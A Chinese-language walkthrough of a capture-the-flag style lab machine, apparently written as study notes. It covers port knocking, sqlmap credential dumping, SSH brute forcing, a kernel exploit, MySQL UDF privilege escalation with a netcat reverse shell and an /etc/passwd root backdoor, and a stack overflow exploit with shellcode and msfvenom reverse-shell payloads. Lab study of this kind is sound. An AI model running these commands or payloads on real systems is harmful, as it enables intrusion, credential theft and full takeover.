1、查询靶场IP：
nmap -sP 10.211.55.0/24
Nmap scan report for localhost (10.211.55.11)


2、nmap -p- 10.211.55.11
仅仅开放了22端口！

3、ssh尝试登录
ssh 10.211.55.11
填写yes发现信息：Easy as 1,2,3
意思是让敲震端口3次！

4、==端口碰撞==

端口试探（port knocking）是一种通过连接尝试，从外部打开原先关闭端口的方法。一旦收到正确顺序的连接尝试，防火墙就会动态打开一些特定的端口给允许尝试连接的主机。

端口试探的主要目的是防治攻击者通过端口扫描的方式对主机进行攻击。端口试探类似于一次秘密握手协议，比如一种最基本的方式：发送一定序列的UDP、TCP数据包。当运行在主机上的daemon程序捕捉到数据包以后，如果这个序列正确，则开启相应的端口，或者防火墙允许客户端通过。

由于对外的Linux服务器通过限制IP地址的方式来控制访问，因此可以利用这种端口试探方式来进行防火墙对于访问IP地址的控制。

如何进行端口碰撞？

首先需要我们知道端口碰撞的序列，否则暴力碰撞开启的机会太小。

1）第一种方法：knock 命令
linux安装：sudo apt install knockd

使用：
knock <IP> <PORT1> <PORT2> <PORT3> <PORT4> -v
例如需要碰撞 172.16.1.1 的 3，4，7，8 端口：
knock 10.211.55.11 1 2 3 -v


2）hping3：TCP/IP数据包组装/分析工具
hping3 -S [IP地址] -p 1 -c 1


hping3 -S 10.211.55.11 -p 1 -c 1
hping3 -S 10.211.55.11 -p 2 -c 1
hping3 -S 10.211.55.11 -p 3 -c 1
----------------
-S（--syn）：SYN是TCP/IP建立连接时使用的握手信号。在客户机和服务器之间建立正常的TCP网络连接时，客户机首先发出一个SYN消息，服务器使用SYN-ACK应答表示接收到了这个消息，最后客户机再以ACK消息响应。这样在客户机和服务器之间才能建立起可靠的TCP连接，数据才可以在客户机和服务器之间传递。
-p --destport： 目的端口（默认为0），可同时指定多个端口
-c --count：指定数据包的次数

参考资料：https://blog.csdn.net/qq_30247635/article/details/86243448
--------------

敲震三次后：
nmap全端口查看情况！nmap -p- 10.211.55.11
PORT     STATE SERVICE
22/tcp   open  ssh
1337/tcp open  waste


5、信息枚举：http://10.211.55.11:1337/
枚举到存在：
http://10.211.55.11:1337/robots.txt
在F12调试界面发现：

THprM09ETTBOVEl4TUM5cGJtUmxlQzV3YUhBPSBDbG9zZXIh

在kali通过base64转码：
echo 'THprM09ETTBOVEl4TUM5cGJtUmxlQzV3YUhBPSBDbG9zZXIh' | base64 -d
Lzk3ODM0NTIxMC9pbmRleC5waHA= Closer!

发现还是base64继续转码：
echo 'Lzk3ODM0NTIxMC9pbmRleC5waHA=' | base64 -d                    
/978345210/index.php
发现目录！


6、SQLmap注入

信息枚举：http://10.211.55.11:1337/978345210/index.php
发现：Welcome to the Gates of Mordor

1）爆破数据库库信息
sqlmap -o -u "http://10.211.55.11:1337/978345210/index.php" --forms --dbs

-------------
Optimization
-o：开启所有优化开关
--predict-output：预测常见的查询输出
--keep-alive：使用持久的HTTP(S)连接
--null-connection：从没有实际的HTTP响应体中检索页面长度

--threads=THREADS：设置请求的并发数
--forms参数，sqlmap会自动从-u中的url获取页面中的表单进行测试
-------------

available databases [4]:
[*] information_schema
[*] mysql
[*] performance_schema
[*] Webapp
爆破出了数据库四个！继续获取webapp数据表信息！

2）爆破数据库表信息
sqlmap -o -u "http://10.211.55.11:1337/978345210/index.php" --forms -D Webapp --tables

Database: Webapp
[1 table]
+-------+
| Users |
+-------+
可以看到Users数据表，继续查看数据表信息！

3）爆破数据库表字段信息

sqlmap -o -u "http://10.211.55.11:1337/978345210/index.php" --forms -D Webapp -T Users --columns

(-D dbname指定数据库名称、-T tablename：指定某数据表的名称、--columns：列出指定表上的所有列)

Database: Webapp
Table: Users
[3 columns]
+----------+--------------+
| Column   | Type         |
+----------+--------------+
| id       | int(10)      |
| password | varchar(255) |
| username | varchar(255) |
+----------+--------------+
可看到数据库Webapp的表Users中存在字段id,password,username信息！

4）爆破字段内容信息

sqlmap -o -u "http://10.211.55.11:1337/978345210/index.php" --forms -D Webapp -T Users --columns -C id,username,password --dump

(-D dbname:指定数据库名称、-T tablename:指定某数据表名称、-C Cnmme:指定列名、--dump:导出列里面的字段)

Database: Webapp
Table: Users
[5 entries]
+----+----------+------------------+
| id | username | password         |
+----+----------+------------------+
| 1  | frodo    | iwilltakethering |
| 2  | smeagol  | MyPreciousR00t   |
| 3  | aragorn  | AndMySword       |
| 4  | legolas  | AndMyBow         |
| 5  | gimli    | AndMyAxe         |
+----+----------+------------------+
获得用户名密码，那么来爆破下！
user：
frodo
smeagol
aragorn
legolas
gimli

passwd：
iwilltakethering
MyPreciousR00t
AndMySword
AndMyBow
AndMyAxe


7、SSH爆破-MSF、Hydra
1）Hydra爆破
hydra -L user.txt -P pass.txt 10.211.55.11 ssh

[22][ssh] host: 10.211.55.11   login: smeagol   password: MyPreciousR00t

2）MSF爆破ssh
-------------------
若有用户名和密码字典的话，使用auxiliary/scanner/ssh/ssh_login模块

若不知道，使用auxiliary/scanner/ssh/ssh_enumusers模块先探测用户名是否存在

参考：https://blog.csdn.net/huweiliyi/article/details/105590291
-------------------

search ssh_login
use auxiliary/scanner/ssh/ssh_login
set rhosts 10.211.55.11
set user_file /root/桌面/lord/user.txt
set pass_file /root/桌面/lord/pass.txt
set stop_on_success true

Success: 'smeagol:MyPreciousR00t'
用户名：smeagol
密码：MyPreciousR00t


8、SSH登录提权
ssh smeagol@10.211.55.11
MyPreciousR00t


9、EXP内核提权
lsb_release -a
-----
No LSB modules are available.
Distributor ID:	Ubuntu
Description:	Ubuntu 14.04.3 LTS
Release:	14.04
Codename:	trusty
-----

谷歌搜索：Ubuntu 14.04 exploit
https://www.exploit-db.com/exploits/39166

searchsploit 39166
locate linux/local/39166.c
cp /usr/share/exploitdb/exploits/linux/local/39166.c /root/桌面/lord

python -m SimpleHTTPServer 8081
wget http://10.211.55.19:8081/39166.c

gcc 39166.c -o dayu
chmod +x dayu
./dayu
cd /root
cat Flag.txt：
“There is only one Lord of the Ring, only one who can bend it to his will. And he does not share power.”
– Gandalf

--------------------

10、Mysql UDF提权

UDF提权先查看mysql版本！
dpkg -l | grep mysql   --查看历史安装包版本
5.5.44

查看mysql运行权限是不是root！
ps aux | grep root   ---查看mysql进程信息

==在寻找mysql账号密码！==
==find / -name login.*==
发现信息：/var/www/978345210/login.php

==grep "password" -rn 存在password信息：==
new mysqli('localhost', 'root', 'darkshadow', 'Webapp');

获得mysql密码：
darkshadow

登录mysql：
mysql -uroot -pdarkshadow

首先看一下是否满足写入条件：
show global variables like 'secure%';
是可以进行UDF提权的！

查看插件目录：
show variables like '%plugin%';
插件目录在：/usr/lib/mysql/plugin/

查看能否远程登陆：
use mysql;
select user,host from user;
只能本地登录！
---------
MySQL中，BLOB是一个二进制大型对象，是一个可以存储大量数据的容器，它能容纳不同大小的数据。BLOB类型实际是个类型系列（TinyBlob、Blob、MediumBlob、LongBlob），除了在存储的最大信息量上不同外，他们是等同的。

MySQL的四种BLOB类型：
类型           大小(单位：字节) 
TinyBlob      最大 255 
Blob          最大 65K 
MediumBlob    最大 16M 
LongBlob      最大 4G 

可以利用lib_mysqludf_sys提供的函数执行系统命令，lib_mysqludf_sys：
sys_eval，执行任意命令，并将输出返回
sys_exec，执行任意命令，并将退出码返回。
sys_get，获取一个环境变量。
sys_set，创建或修改一个环境变量。

cp /usr/share/metasploit-framework/data/exploits/mysql/lib_mysqludf_sys_32.so .
mv lib_mysqludf_sys_32.so dayu.so


mysql -uroot -pdarkshadow
use mysql
create table dayu(dayu longblob);
insert into dayu values (load_file('/tmp/dayu.so'));
select * from dayu into dumpfile '/usr/lib/mysql/plugin/dayu.so';
create function sys_exec returns string soname 'dayu.so';
select * from mysql.func;
select sys_exec('chmod u+s /usr/bin/find');
find / -exec '/bin/sh' \;
----------

拓展知识点：或者利用sys_exec、sys_eval

select sys_exec('nc -nv 10.211.55.19 6677 -e /bin/bash');

openssl passwd dayu1
YpIR51FecR9AY
select sys_exec('echo "dayu1:Ef8ipBmhp5pnE:0:0:root:/root:/bin/bash" >> /etc/passwd');

------

11、缓冲区溢出漏洞

ESP：栈指针寄存器(extended stack pointer)，其内存放着一个指针，该指针永远指向系统栈最上面一个栈帧的栈顶。
ESP就是前面说的，始终指向栈顶，只要ESP指向变了，那么当前栈顶就变了。

EBP：基址指针寄存器(extended base pointer)，其内存放着一个指针，该指针永远指向系统栈最上面一个栈帧的底部。
EBP存储着当前函数栈底的地址，栈底通常作为基址，我们可以通过栈底地址和偏移相加减来获取变量地址（很重要）。

ESP：栈指针寄存器(extended stack pointer)，其内存放着一个指针，该指针永远指向系统栈最上面一个栈帧的栈顶。
EIP存储着下一条指令的地址，每执行一条指令，该寄存器变化一次。
可以说如果控制了EIP寄存器的内容，就控制了进程——我们让EIP指向哪里，CPU就会去执行哪里的指令。


查看SUID弱点值：
find / -perm -g=s -o -perm -4000 ! -type l -maxdepth 3 -exec ls -ld {} \; 2>/dev/null
------------------------
file命令比较每个文件的哈希值：
file /SECRET/door1/file /SECRET/door2/file /SECRET/door3/file

或者使用du -b查看字节：
du -b /SECRET/door1/file /SECRET/door2/file /SECRET/door3/file

7370	/SECRET/door1/file
5150	/SECRET/door2/file
7370	/SECRET/door3/file

或者使用ls -lahR比较创建的文件大小/日期：
cd /SECRET/
ls -lahR
------------------------
使用python命令快速模糊判断多少个字符会导致程序崩溃。Python有-c参数，允许代码直接从shell执行：

./file $(python -c 'print "A" * 200')
Illegal instruction (core dumped)
发现存在溢出值，需要把文件拷贝出来进行本地分析！

base64文件拷贝：
base64 file    ----将file二进制文件转换base
然后复制到文本中：base64.txt
cat base64.txt | base64 -d > file   ---将文本文件转换回可执行文件
检查MD5和sha1值：
file file
md5sum file

这时候就讲文件拷贝到kali本地进行分析。

-------------------

方法1：
安装pwndbg

常见命令：
https://my.oschina.net/u/4292771/blog/3305933

记得更新源：
https://blog.csdn.net/weixin_42380348/article/details/89959761

git clone https://github.com/pwndbg/pwndbg
cd pwndbg
sudo ./setup.sh
这里一定要更新源，在用代理更新下载！如果要修改就执行：
vi ~/.gdbinit    ---用哪个就注释即可

1）调试file
gdb -q ./file    ---gdb调试file文件

2）生成1000位值
/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 1000

3）GDB执行值
run Aa0A.........
0x41376641 in ?? ()
查看到错误点在41376641。

4）解析错误点判断偏移量：
/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q 41376641
[*] Exact match at offset 171
查看到偏移量为171。

5）尝试在偏移量171溢出后情况：
r $(python -c 'print "A" * 171 + "B" * 4')
EIP: 0x42424242 ('BBBB')
可看到EIP已经被填充BBBB可控制。

6）查看ASLR设置：
cat /proc/sys/kernel/randomize_va_space
2
或者：
sysctl -a --pattern randomize
kernel.randomize_va_space = 2

0 = 关闭
1 = 半随机。共享库、栈、mmap() 以及 VDSO 将被随机化。（留坑，PIE会影响heap的随机化。。）
2 = 全随机。除了1中所述，还有heap。
说明存在随机化！！！其实就算关闭了ASLR，在root

权限下还执行了计划任务switcher.py每三分钟变换一次值，还会打乱缓冲区溢出的“ buf”文件，因此让缓冲区溢出难度加大！

参考资料：
https://blog.csdn.net/counsellor/article/details/81543197

绕过ASLR的一种方法是通过编写一个自动循环脚本来强制堆栈，接下来要放入payload需要进行nop sled来爆破一个空间出来！

7）Nop空间测试ESP：
run $(python -c 'print "A" * 171 + "B" * 4 + "\x90" * 2000')
x/s $esp
0xffffc810:	'\220' <repeats 200 times>...
这时候ESP变了，指向了ffffc810地址，这是nop sled的地址开始处，当ESP指向该地址处后，就会执行栈堆空间的payload获得shell，那么接下来就是要爆破
nop sled被访问。

8）恶意payload
peda help shellcode –-- 关于 shellcode 的帮助
shellcode search exec –-- 如何使用 'exec' 搜索所有 shellcode
shellcode display 841 –-- 显示找到的代码的来源


shellcode generate x86/linux exec --– 生成代码
shellcode = (
    "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31"
    "\xc9\x89\xca\x6a\x0b\x58\xcd\x80"
)

9）检查文件是否做了安全措施：
checksec
CANARY    : disabled
FORTIFY   : disabled
NX        : disabled
PIE       : disabled
RELRO     : disabled


10）增加nop sled被访问机会：可以增加10000....   
run $(python -c 'print "A" * 171 + "\x60\xc8\xff\xff" + "\x90" * 20000 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\x89\xca\x6a\x0b\x58\xcd\x80"')

0x ffffc860
ff ff c8 60
\x60\xc8\xff\xff
等一分钟左右就能获得shell！

11）for循环爆破找nop碰撞执行shell：
for a in {1..1000}; do ./file $(python -c 'print "A" * 171 + "\xa0\x64\x8b\xbf" + "\x90" * 20000 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\x89\xca\x6a\x0b\x58\xcd\x80"'); done

如果文件在几分钟后随机变动了，不在该目录底下，在没有for循环nop拿到shell后，又得跑到溢出file的目录下载执行一次for，很麻烦！

------------

缓冲区溢出是针对程序设计缺陷，向程序输入缓冲区写入使之溢出的内容（通常是超过缓冲区能保存的最大数据量的数据），从而破坏程序运行、趁著中断之际并获取程序乃至系统的控制权。


方法2：
https://blog.csdn.net/missmxr/article/details/121451920

1）进入door1，只有file文件，尝试分析猜测文件
objdump -d --no-show-raw-insn file   ---查看可执行函数的十六进制显示file

strings file
查看door2，door3目录，都只有file文件，但是分析时发现door2下的file存在strcpy！

参考百度百科熟悉strcpy：
https://baike.baidu.com/item/%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA/678453?fr=aladdin
https://blog.csdn.net/weixin_30709635/article/details/99100913

2）msf生成1000字符串，使用gdb调试
/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 1000

gdb file 
run ....

3）查找溢出位置
/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q 41376641

溢出位置为171！验证下eip的内容！

如果存在溢出，肯定要写入恶意代码，那么有没有写入的权限程序，往下查看！

4）vmmap查看信息  栈溢出

STACK：栈，用来保存函数运行时的临时变量等
HEAP：堆，一般是主动编写代码来分配和回收堆内存
CODE: 代码段，是用来存放代码的
DATA：数据段，一般用来存放全局变量
参考：https://ch4r1l3.github.io/2018/06/22/pwn从入门到放弃第三章——gdb的基本使用教程/

5）验证EIP
r $(python -c 'print "A"*171 + "B"*4 + "C"*20')

6）验证ESP
x/20b $esp

存在c的，那么确认坏字符！


7）确认坏字符
缓冲区溢出的在生成shellcode时，会影响输入的字符，比如’n’字符会终止输入，会截断输入导致我们输入的字符不能完全进入缓冲区。常见的坏字符有x0a、x0b、x00


现在生成一串与字节数组相同的坏字符。以下 python 脚本可用于生成从 \x01 到 \xff 的坏字符字符串：
---------
#!/usr/bin/env python
from __future__ import print_function

for x in range(1, 256):
    print("\\x" + "{:02x}".format(x), end='')

print()
---------
r $(python -c 'print "A"*171 + "B"*4 + ""')


x/256x $esp   ---如果出问题就x和b换用

能看到1-8是正常的，后门就全乱了，怀疑0x08后面的0x00和0x09是个坏字符，至于后面全乱序猜测是因为0x0a换行符的问题。重新来，去掉0x09和0x0a：

好看多了，但是从0x20又开始乱了，去掉0x20后门就好了。
注意：这一定要仔细看，因为看少了看错了都会导致msf的payload执行不成功！
重新来，去掉0x09、0x0a和0x20：

坏字符总结为0x09、0x0a、0x20、再加个0x00！（默认排除空字节\x00）


8）msf生成payload
-----------
windows：
msfvenom -p windows/shell_reverse_tcp LHOST=xxx.xxx.xxx.xxx LPORT=4444 EXITFUNC=thread -b "\x00\x0a\x0d" -f py -v

Linux：
msfvenom -a x86 --platform linux -p linux/x86/shell_reverse_tcp LHOST=x.x.x.x LPORT=443 -b "\x00\x09\x0a\x20" EXITFUNC=thread -f c

linux2：
msfvenom -a x86 -p linux/x86/exec CMD=/bin/sh -b '\x00\x09\x0a\x20' -e x86/shikata_ga_nai -fc

payload：
-a  框架选择
-p 载荷类型

LHOST 本机地址
LPORT

-b 坏字符
-e 要使用的编码器
-f 编译的语言
-c 指定要包含的附加 win32 shellcode 文件
-v 载荷的名称
------------
9）查看jmp
最后需要看看是否有调用jmp到es（因为我们无法控制 eax），查看能够更好的控制漏洞利用的过程，防止不成功。

objdump -D file | grep -P 'jmp|call' | grep esp


回显esp，不需要jmp做跳板到shellcode，接下来绕过就是用大量的nop即可！

10）bash执行shell

"\xb8\x37\xc9\x64\x34\xda\xd6\xd9\x74\x24\xf4\x5b\x29\xc9\xb1\x0b\x31\x43\x15\x03\x43\x15\x83\xc3\x04\xe2\xc2\xa3\x6f\x6c\xb5\x66\x16\xe4\xe8\xe5\x5f\x13\x9a\xc6\x2c\xb4\x5a\x71\xfc\x26\x33\xef\x8b\x44\x91\x07\x83\x8a\x15\xd8\xbb\xe8\x7c\xb6\xec\x9f\x16\x46\xa4\x0c\x6f\xa7\x87\x33"

------
0xbf96b590
bf 96 b5 90
\x90\xb5\x96\xbf

#!/bin/bash
while true; do
  $(find /SECRET -type f -size 5150c) $(python -c 'print "A"*171 + "\x90\xb5\x96\xbf" + "\x90"*20000 + "\xb8\x37\xc9\x64\x34\xda\xd6\xd9\x74\x24\xf4\x5b\x29\xc9\xb1\x0b\x31\x43\x15\x03\x43\x15\x83\xc3\x04\xe2\xc2\xa3\x6f\x6c\xb5\x66\x16\xe4\xe8\xe5\x5f\x13\x9a\xc6\x2c\xb4\x5a\x71\xfc\x26\x33\xef\x8b\x44\x91\x07\x83\x8a\x15\xd8\xbb\xe8\x7c\xb6\xec\x9f\x16\x46\xa4\x0c\x6f\xa7\x87\x33"') 2> /dev/null
  sleep 1
done

ls -la   ---查看文件大小
-size  ---表示文件大小
-type  ---文件类型  
f 普通文件
-------
wget http://10.211.55.19:8081/exp.sh
chmod +x exp.sh
./exp.sh
成功！！！


1、文件会随机变动到三个文件夹中！
2、python脚本计划任务在执行随机变动
3、ALSR开启了安全保护   ---绕过是nop  for循环碰撞
4、checksec安全保护机制没开启
5、jmp esp 不需要
6、解决坏字符问题

延伸出问题：
4、checksec安全保护机制没开启
5、jmp esp 不需要
checksec有六种机制，如果开启了某个，怎么去绕过！....待思考？？？
jmp esp怎么去查看他的地址值！？？？

这些问题都搞懂了，缓冲区溢出基本就读懂%70~80
后面还要读懂一些函数指令！

-----------
方法3：
GDB进行分析！peda安装：
参考文章：
https://blog.csdn.net/aoxixi/article/details/90142736

git clone https://github.com/longld/peda.git ~/peda
echo "source ~/peda/peda.py" >> ~/.gdbinit
想要用某一个插件的时候，只要输入对应命令就行！

gdb file    ---gdb分析file文件

在peda中运行，EIP被我们的4*B覆盖，ESP寄存器指向我们4*C：
r $(python -c 'print "A"*171 + "B"*4 + "C"*4')
EBP: 0x41414141 ('AAAA')
ESP: 0xffffcfe0 ("CCCC")
EIP: 0x42424242 ('BBBB')

-----------

方法4：
安装：edb
proxychains apt install edb-debugger

目前已经知道171会导致程序崩溃，创建一个通用脚本测试EIP看看4个B会不会出现：
-------------
#!/usr/bin/python
padding = "A" * 171
eip = "B" * 4
shellcode = "C" * 4
buffer = padding + eip + shellcode
print buffer;
-------------

edb --run ./file $(python testdayu.py)


--------
pwn环境搭建：
https://mambainveins.com/2021/07/23/2021/2021-07-23-pwn_env/

https://blog.csdn.net/whbing1471/article/details/112410599




https://isbase.cc/tip/exploit/tip-2.html
https://www.exploit-db.com/exploits/25971
https://baike.baidu.com/item/%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA/678453?fr=aladdin
http://blog.chinaunix.net/uid-10769062-id-4220113.html







